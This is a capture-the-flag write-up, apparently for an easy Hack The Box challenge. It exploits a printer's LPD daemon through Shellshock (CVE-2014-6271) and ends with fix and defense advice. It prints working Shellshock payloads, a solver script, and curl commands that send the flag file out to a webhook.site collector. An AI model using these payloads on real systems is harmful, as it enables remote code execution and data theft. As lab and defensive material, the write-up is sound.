## Overview

*Line* is an Easy **Hardware** challenge. You are given a network printer that speaks the **Line Printer Daemon (LPD)** protocol ([RFC 1179](https://www.rfc-editor.org/rfc/rfc1179)) and asked to audit it. The daemon takes the metadata attached to a print job — hostname, user, job name, and file names — and copies those strings into environment variables before it runs `/bin/bash`. On an unpatched bash that is a direct path to remote code execution via **Shellshock** ([CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)), a classic [OS command injection](https://cwe.mitre.org/data/definitions/78.html) — a print job's *filename* becomes a shell command.

## The technique

LPD is a tiny TCP protocol: connect, send a command byte, then transfer a *control file* (the job's metadata) and a *data file* (the thing to print). This daemon places control-file fields into the process environment and then shells out. **Shellshock** is a bug in how bash imports exported *function* definitions from environment variables — it kept executing whatever text followed the function body. `() { :; };` is an empty function; everything after the `;` runs. So any control-file field set to `() { :; }; <cmd>` runs `<cmd>` with the daemon's privileges.

## Solution

First fingerprint the service — LPD normally lives on port 515, and a raw send-queue-state probe confirms it is listening:

```bash
nc -vz <host> <port>
printf '\x04lp\n' | nc <host> <port>
```

The cleanest delivery is [PRET](https://github.com/RUB-NDS/PRET)'s `lpdtest.py`. Its `in` mode stuffs the same value into *every* control-file field — including the receive-command **file name**, which is the field this daemon shells out with — so one call plants the Shellshock payload in the sink.

Confirm blind RCE and outbound connectivity with a harmless beacon, then read the callback on a webhook you control:

```bash
python3 lpdtest.py <host> --port <port> in '() { :; }; curl -s https://<collector>/?p=BEACON'
```

Because the RCE is **blind** (the daemon returns no command output) and the attacker box here sits behind NAT with no reverse-shell path, the flag is exfiltrated **out-of-band** — the target's own `curl` POSTs the flag file to a collector both ends can reach:

```bash
python3 lpdtest.py <host> --port <port> in '() { :; }; curl -s https://<collector>/ -d @/opt/flag.txt'
```

The POST body that lands on the collector is the flag. The full solver:

`solve.py`:

```python
#!/usr/bin/env python3
import subprocess, sys, os
RHOST, RPORT, HOOK = sys.argv[1], sys.argv[2], sys.argv[3]
payload = f"() {{ :; }}; curl -s https://webhook.site/{HOOK}/ -d @/opt/flag.txt"
lpdtest = os.path.join(os.path.dirname(__file__), "files", "lpdtest.py")
subprocess.run(["python3", lpdtest, RHOST, "--port", RPORT, "in", payload])
```

Read it back from the collector:

```bash
curl -s https://webhook.site/token/<HOOK>/requests
```

Solved — the flag renders as `HTB{...}`.

## Why it worked

The daemon trusted network-supplied job metadata and passed it into the environment of a shell. Two nuances mattered in practice:

- **Keep the injected payload trivial.** A payload using `$(...)` or pipes never fired — the string is consumed as an LPD *filename* first and the subshell got mangled. `curl -d @/opt/flag.txt` (no subshell, no pipe) is robust.
- **Blind RCE plus a NAT'd attacker forces out-of-band exfil.** A collector that both ends reach by *outbound* HTTP sidesteps the missing reverse-shell path entirely.

## Fix / defense

- Never pass network-supplied job metadata (hostname, user, job name, file names) into a shell or into the environment of a shell. Invoke external programs with an argument vector (`shell=False` / `execve`), not a constructed command string.
- Validate and allowlist LPD file names against `[A-Za-z0-9._-]`.
- Patch bash ([CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)) and run the daemon as a low-privilege, egress-restricted account.
